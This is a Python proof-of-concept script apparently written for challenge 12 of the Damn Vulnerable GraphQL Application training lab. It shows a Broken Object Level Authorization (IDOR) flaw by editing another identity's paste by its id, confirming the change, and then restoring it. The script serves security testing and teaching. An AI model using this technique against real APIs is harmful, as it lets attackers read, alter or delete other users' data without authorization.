#!/usr/bin/env python3
"""
dvga_challenge_12_bola_pastes.py — Broken Object Level Access (pastes).

DVGA's paste mutations/queries take a raw `id` and never check that the caller
owns the paste:
  * `editPaste(id, title, content)`  -> Paste.query.filter_by(id=id).update(...)
  * `deletePaste(id)`                -> Paste.query.filter_by(id=id).delete()
  * `paste(id)` / `read_and_burn(id)`-> read any paste by id
There is no ownership / authorization check tying the paste to the caller —
so any client can read, modify, or delete ANY paste by guessing/enumerating
its id.

RELIABLE signal: we create a paste (victim object), then, as a DIFFERENT
identity, edit that foreign paste's title to a marker and confirm the change
persisted (BOLA write). We then restore it. We do not mass-delete the seeded
data.
Run: python3 dvga_challenge_12_bola_pastes.py [--config ...]
"""
import argparse
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="BOLA on pastes (edit foreign paste by id)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)

    # 1) Victim creates a paste (the "foreign object").
    victim = dv.consumer_headers(812)
    r = dv.graphql(base, """
      mutation($t: String!, $c: String!) {
        createPaste(title: $t, content: $c, public: true, burn: false) { paste { id title } }
      }
    """, {"t": "victim paste", "c": "original"}, cfg, victim, tout)
    body = r.json() if (r is not None and r.headers.get("content-type", "").find("json") >= 0) else {}
    paste = (((body.get("data") or {}).get("createPaste") or {}).get("paste") or {})
    pid = paste.get("id")
    if pid is None:
        print("could not create a victim paste to target — aborting.")
        return
    print(f"victim created paste id={pid} title={paste.get('title')!r}")

    # 2) Attacker (different identity) edits the foreign paste by id.
    attacker = dv.consumer_headers(913)
    marker = "BOLA" + uuid.uuid4().hex[:6]
    r = dv.graphql(base, """
      mutation($id: Int, $t: String) { editPaste(id: $id, title: $t) { paste { id title } } }
    """, {"id": int(pid) if str(pid).isdigit() else 1, "t": marker}, cfg, attacker, tout)
    body = r.json() if (r is not None and r.headers.get("content-type", "").find("json") >= 0) else {}
    edited = (((body.get("data") or {}).get("editPaste") or {}).get("paste") or {})
    changed = edited.get("title") == marker
    print(f"attacker editPaste(id={pid}) -> title now {edited.get('title')!r}")

    # 3) Confirm persistence by reading it back as a third identity.
    reader = dv.consumer_headers(999)
    r = dv.graphql(base, "query { paste(id: %s) { id title } }" % (int(pid) if str(pid).isdigit() else 1),
                   None, cfg, reader, tout)
    body = r.json() if (r is not None and r.headers.get("content-type", "").find("json") >= 0) else {}
    readback = (((body.get("data") or {}).get("paste") or {}).get("title"))
    print(f"reader  paste(id={pid})   -> title {readback!r}")

    # 4) Best-effort restore (harmless — it's a throwaway paste we created).
    dv.graphql(base, "mutation($id: Int, $t: String) { editPaste(id: $id, title: $t) { paste { id } } }",
               {"id": int(pid) if str(pid).isdigit() else 1, "t": "victim paste"}, cfg, victim, tout)

    bola = changed or (readback == marker)
    print()
    if bola:
        print("[FINDING] editPaste(id:) modified a paste the caller does not own — no object-level "
              "authorization (BOLA / IDOR). deletePaste(id:) and paste(id:) are equally unprotected.")
    else:
        print("[ok] the foreign paste was not modified (ownership check present on this build).")


if __name__ == "__main__":
    main()
